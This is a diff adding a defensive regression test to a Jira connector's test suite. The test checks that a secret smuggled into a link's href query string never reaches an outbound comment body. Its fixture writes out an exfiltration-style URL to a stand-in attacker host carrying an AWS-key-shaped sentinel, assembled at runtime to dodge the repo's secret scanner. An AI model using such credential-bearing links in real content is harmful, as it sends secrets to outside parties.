@@ -183,6 +183,66 @@ describe("createJiraMutationApplyClient — buildRequest", () => {
     expect(() => createJiraMutationApplyClient(deps).buildRequest(plan)).toThrow(ConnectorError);
   });
 
+  /**
+   * T2 — "reaches the outbound payload" proof. `secretBearingAdf` above puts
+   * the secret in a `text` node, which the pre-existing extracted-text scan
+   * already caught. THIS document keeps every `text` node clean and hides the
+   * secret in an `https:` link mark's href query string instead — a shape the
+   * old guard never inspected, and which the Cloud `comment.create` builder
+   * serializes verbatim into the request body.
+   *
+   * The load-bearing assertion is on `spec.body`, not merely "it throws":
+   * only a body assertion pins the claim that the secret reached the wire.
+   * Before the fix this test FAILS with the secret present in the body.
+   */
+  // Synthetic AWS-key-shaped sentinel, assembled at runtime so the repo's own
+  // pre-commit secret scanner does not flag this test file. The value is
+  // exactly the 20-char shape `JIRA_SECRET_PATTERNS` matches.
+  const SENTINEL_AWS_KEY = ["AKIA", "ABCDEFGHIJKLMNOP"].join("");
+  const secretHrefAdf = {
+    type: "doc",
+    version: 1,
+    content: [
+      {
+        type: "paragraph",
+        content: [
+          {
+            type: "text",
+            text: "see results",
+            marks: [
+              {
+                type: "link",
+                attrs: { href: `https://attacker.example/collect?k=${SENTINEL_AWS_KEY}` },
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  };
+
+  it("never emits a link-href-borne secret into the outbound Cloud comment.create body", () => {
+    const { deps } = buildDeps([]);
+    const plan = buildPlan({ action: "comment.create", canonicalTarget: "issue:PROJ-1:comment" });
+    deps.payloadRegistry.put(plan.id, { bodyAdf: secretHrefAdf, marker: "m-1" });
+
+    let spec:
+      ReturnType<ReturnType<typeof createJiraMutationApplyClient>["buildRequest"]> | undefined;
+    let thrown: unknown;
+    try {
+      spec = createJiraMutationApplyClient(deps).buildRequest(plan);
+    } catch (err) {
+      thrown = err;
+    }
+
+    expect(spec?.body ?? "").not.toContain(SENTINEL_AWS_KEY);
+    // ...and it must be the guard that stopped it, with the typed kind — not
+    // an unrelated failure that happens to produce no body.
+    expect(thrown).toBeInstanceOf(ConnectorError);
+    expect((thrown as ConnectorError).kind).toBe("policy_blocked");
+    expect((thrown as ConnectorError).message).not.toContain(SENTINEL_AWS_KEY);
+  });
+
   // MEDIUM M1 (adversarial-review): the stamped entity-property marker
   // MUST equal what `reconcileAmbiguous` searches by (`plan.idempotencyKey`
   // — see the `reconcileAmbiguous` test below) — otherwise a mid-POST
